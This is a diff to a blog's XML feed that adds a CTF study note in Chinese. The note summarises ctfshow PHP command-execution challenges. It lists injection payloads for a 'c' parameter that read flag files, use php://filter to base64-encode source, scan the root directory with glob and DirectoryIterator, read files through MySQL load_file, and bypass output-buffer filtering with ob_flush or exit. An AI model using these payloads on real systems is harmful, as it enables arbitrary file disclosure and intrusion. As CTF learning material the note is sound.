@@ -4,6 +4,32 @@
   
   
   <entry>
+    <title>ctfshow命令执行总结</title>
+    <link href="/2024/03/10/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
+    <url>/2024/03/10/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
+    
+    <content type="html"><![CDATA[<p>c&#x3D;highlight_file(“flag.php”);<br>c&#x3D;require(“flag.php”);<br>c&#x3D;include(“flag.php”);<br>c&#x3D;show_source(“flag.php”);<br>c&#x3D;print_r(scandir(“&#x2F;“));<br>c&#x3D;var_export(glob(‘..&#x2F;..&#x2F;..’.’&#x2F;*’));<br>c&#x3D;var_dump(scandir(“&#x2F;“);<br>c&#x3D;var_export(scandir(“&#x2F;“);<br>c&#x3D;print_r(scandir(dirname(‘FILE’)));<br>c&#x3D;include($_POST[‘a’]);&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>利用glob协议扫描目录的命令：<br>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);?>(扫描根目录下的所有文件);<br>mysql的load_file读取文件<br>c&#x3D;$conn &#x3D; mysqli_connect(“127.0.0.1”, “root”, “root”, “ctftraining”); $sql &#x3D; “select load_file(‘&#x2F;flag36.txt’) as a”; $row &#x3D; mysqli_query($conn, $sql); while($result&#x3D;mysqli_fetch_array($row)){ echo $result[‘a’]; } exit();<br>提前送出缓冲区或终止程序<br>        $s &#x3D; ob_get_contents();<br>        ob_end_clean();<br>        echo preg_replace(“&#x2F;[0-9]|[a-z]&#x2F;i”,”?”,$s);<br>源码劫持了输出缓冲并且将数字和字母替换成了?。<br>法一<br>在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：<br>ob_flush();<br>ob_end_flush();<br>payload示例：<br>c&#x3D;include(‘&#x2F;flag.txt’);ob_flush();<br>法二<br>提前终止程序，即执行完代码直接退出，可以调用的函数有：<br>exit();<br>die();<br>payload示例：<br>c&#x3D;include(‘&#x2F;flag.txt’);exit();</p><p>来自 <a href="https://ctf.show/writeups/1188993">https://ctf.show/writeups/1188993</a> </p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>布尔盲注</title>
+    <link href="/2024/03/01/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
+    <url>/2024/03/01/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>RSA</title>
     <link href="/2024/02/29/RSA/"/>
     <url>/2024/02/29/RSA/</url>
